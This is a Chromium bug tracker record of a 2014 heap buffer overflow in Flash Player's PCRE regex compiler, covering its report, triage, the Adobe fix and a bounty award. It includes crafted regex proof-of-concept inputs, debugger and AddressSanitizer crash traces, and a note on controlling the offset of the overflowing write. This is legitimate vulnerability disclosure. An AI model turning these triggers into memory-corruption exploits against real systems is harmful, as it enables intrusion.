# Heap-based buffer overflow in Flash PCRE regex engine

| Field | Value |
|-------|-------|
| **Issue ID** | [40080896](https://issues.chromium.org/issues/40080896) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | ya...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2014-11-21 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

This bug can be triggered by compiling a specifically crafted regexp in ActionScript code. In most cases the crash happens during unloading of the movie, and the disassembly code near the offending instruction indicates something related to custom heap management implemented in AVM, so presumably this is a heap buffer overflow issue, but I need more time to confirm it.

**VERSION**  

Chrome 39.0.2171.65 (64-bit) stable / Ubuntu 14.04 LTS  

Chrome 40.0.2214.10 (64-bit) dev / Ubuntu 14.04 LTS

**REPRODUCTION CASE**

1. Compile the following ActionScript code with Flex SDK:  
   
   package  
   
   {  
   
   import flash.display.Sprite;  
   
   import flash.external.\*;
   
   public class Main extends Sprite  
   
   {  
   
   public function Main():void  
   
   {  
   
   new RegExp("\3{1,2}|(?s-i:[\W]+|ac){37}|(?!BBBBBBBBBB)AAAAAAAAAA");  
   
   }  
   
   }  
   
   }
2. sudo python -m SimpleHTTPServer 80
3. Launch the browser and navigate to <http://localhost/crasher.swf>, where crasher.swf was generated in step 1.
4. Refresh the tab a few times if it doesn't crash immediately.

## Attachments

- [main.as](attachments/main.as) (application/octet-stream, 233 B)
- [crasher.swf](attachments/crasher.swf) (application/octet-stream, 765 B)
- [gdb.log](attachments/gdb.log) (text/plain, 17.2 KB)

## Timeline

### ya...@gmail.com (2014-11-21)

Here is what the crash looks like, with Chrome 40.0.2214.10 (64-bit) + Ubuntu 14.04:

Program received signal SIGSEGV, Segmentation fault.
0x00007f6920148459 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
(gdb) bt
#0  0x00007f6920148459 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#1  0x00007f691fbc6b78 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#2  0x00007f691fcabc50 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#3  0x00007f691f8a13b2 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#4  0x00007f691f8a2e33 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#5  0x00007f691fb43fe0 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#6  0x00007f691f89d0f8 in ?? () from /opt/google/chrome-unstable/PepperFlash/libpepflashplayer.so
#7  0x00007f69346c82d2 in ?? ()
#8  0x0000372fc6d841c0 in ?? ()
#9  0x0000372fc6cc9c20 in ?? ()
#10 0x00007fff879fa918 in ?? ()
#11 0x00007f6933c993ee in ?? ()
#12 0x00007f691caa5000 in ?? ()
#13 0x01007f6931271177 in ?? ()
#14 0x00007fff879fa8a0 in ?? ()
#15 0x869e97c3bf8048f1 in ?? ()
#16 0x0000000000000001 in ?? ()
#17 0x00007f69358fc940 in ?? ()
#18 0x0000000000000000 in ?? ()
(gdb) x/i $pc
=> 0x7f6920148459:	mov    0x18(%rax),%rax
(gdb) p/x $rax
$1 = 0x1b421b421b421b42
(gdb)


### cl...@chromium.org (2014-11-21)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6049474282520576

### ya...@gmail.com (2014-11-21)

Also reproduced with Chrome 39.0.2171.65 (64-bit) + Win7. I've checked tamarin-redux (win32 build of the latest tip) but it seems not affected by this bug.


### lg...@chromium.org (2014-11-21)

Reproduced on OSX (and uploaded to ClusterFuzz for testing).

(A while back actually; just haven't gotten around to commenting. ;-)

### cl...@chromium.org (2014-11-21)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5704791178084352

### cl...@chromium.org (2014-11-21)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5704791178084352

Uploader: lgarron@chromium.org
Job Type: Windows_asan_chrome

Crash Type: CHECK failure
Crash Address: 
Crash State:
  CHECK failed: false in platform_font_win.cc(112)
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=304464:305009

Minimized Testcase (0.00 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97Bqnmtis3yR7Y0LKwnq-1BJodXC8xjMNPuiXBD5o3WQ12tjjhc5HL_NWXGDYcOT76NzpzKNo7zCxq_ee-_UcuHP-kGhI5UHHBK1QMBsOmtXJf9DAivxN-8VAY6gtR23KmKSSt_bv2al4dpr7lC6nRNG_4gbA



### lg...@chromium.org (2014-11-21)

Chris: Could you take a look at this?

### cl...@chromium.org (2014-11-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-11-21)

Will do!

### cl...@chromium.org (2014-11-22)

ClusterFuzz has detected this issue as fixed in range 282631:282653.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5704791178084352

Uploader: lgarron@chromium.org
Job Type: Windows_asan_chrome

Crash Type: CHECK failure
Crash Address: 
Crash State:
  CHECK failed: false in platform_font_win.cc(112)
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=304464:305009
Fixed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=282631:282653

Minimized Testcase (0.00 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97Bqnmtis3yR7Y0LKwnq-1BJodXC8xjMNPuiXBD5o3WQ12tjjhc5HL_NWXGDYcOT76NzpzKNo7zCxq_ee-_UcuHP-kGhI5UHHBK1QMBsOmtXJf9DAivxN-8VAY6gtR23KmKSSt_bv2al4dpr7lC6nRNG_4gbA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### sc...@gmail.com (2014-11-22)

@yangdingning is back, yay!

cc:ing Mark and Ian who are both looking into regexes at this time.

### sc...@gmail.com (2014-11-22)

I refreshed the repro a few times on my Chromebook and one of the crashes is pretty indicative:

https://crash.corp.google.com/browse?stbtiq=ac7204e73b049ac0

Thread 0 CRASHED [SIGSEGV @ 0x00007fd18343d000] MAGIC SIGNATURE THREAD
0x00007fd18df93cb7	[libc-2.15.so + 0x0013acb7 ]
-> probably memcpy(), and it's called from compile_regex, a PCRE symbol that's part of the open source avmplus drop:

https://github.com/adobe-flash/avmplus/blob/master/pcre/pcre_compile.cpp


I think the CHECK failure is a red herring and a transient failure on trunk. I'm readjusting the bug.

### ma...@google.com (2014-11-22)

See below for a reduced repro: 

(?s:[\s]){1}

You can control the offset of the write off the end of the heap buffer using the count; not sure if this will also affect the size of the write. The data that is being written is dependent on the contents of the set.

### ma...@google.com (2014-11-22)

Oh, here's an ASAN trace from my flash regex test harness (avmplus github build) - code has been beautified so line numbers won't match... This actually crashes in a differently to the original poc, which died in a memcpy.

=================================================================
==18338== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x601000008000 at pc 0xd69b85 bp 0x7fffeee2a490 sp 0x7fffeee2a488
WRITE of size 1 at 0x601000008000 thread T0
    #0 0xd69b84 in compile_regex /usr/local/google/home/markbrand/fuzzing/avmplus-build/../avmplus/pcre/pcre_compile.cpp:7230
    #1 0xd69b84 in avmplus_pcre_compile2 /usr/local/google/home/markbrand/fuzzing/avmplus-build/../avmplus/pcre/pcre_compile.cpp:8039
    #2 0x407a62 in main /usr/local/google/home/markbrand/fuzzing/avmplus-build/../avmplus/shell/avmshellUnix.cpp:104
    #3 0x7f7cbf27fec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
    #4 0x416305 in _start (/usr/local/google/home/markbrand/fuzzing/avmplus-build/shell/avmshell+0x416305)
0x601000008000 is located 0 bytes to the right of 96-byte region [0x601000007fa0,0x601000008000)
allocated by thread T0 here:
    #0 0x7f7cbfe6141a (/usr/lib/x86_64-linux-gnu/libasan.so.0+0x1541a)
    #1 0xd64826 in avmplus_pcre_compile2 /usr/local/google/home/markbrand/fuzzing/avmplus-build/../avmplus/pcre/pcre_compile.cpp:7988
    #2 0x10fa7bf in _fini (/usr/local/google/home/markbrand/fuzzing/avmplus-build/shell/avmshell+0x10fa7bf)
SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/local/google/home/markbrand/fuzzing/avmplus-build/../avmplus/pcre/pcre_compile.cpp:7230 compile_regex
Shadow bytes around the buggy address:
  0x0c027fff8fb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff8fc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff8fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff8fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff8ff0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c027fff9000:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff9010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff9020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff9030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff9040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c027fff9050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==18338== ABORTING
Aborted

### cl...@chromium.org (2014-11-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-11-24)

Adobe acknowledged with ID PSIRT-3157.

### in...@chromium.org (2015-01-07)

No more M39 patches, moving to M40.

### in...@chromium.org (2015-01-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-01-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-01-17)

Fixed here:
http://helpx.adobe.com/security/products/flash-player/apsb15-01.html
http://googlechromereleases.blogspot.com/2015/01/stable-channel-update.html

### cl...@chromium.org (2015-01-17)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2015-01-22)

Congrats - $3000 for this report (and thanks for letting us know!).

### in...@chromium.org (2015-01-25)

[Empty comment from Monorail migration]

### ti...@google.com (2015-02-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-03-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-04-25)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/435383?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080896)*
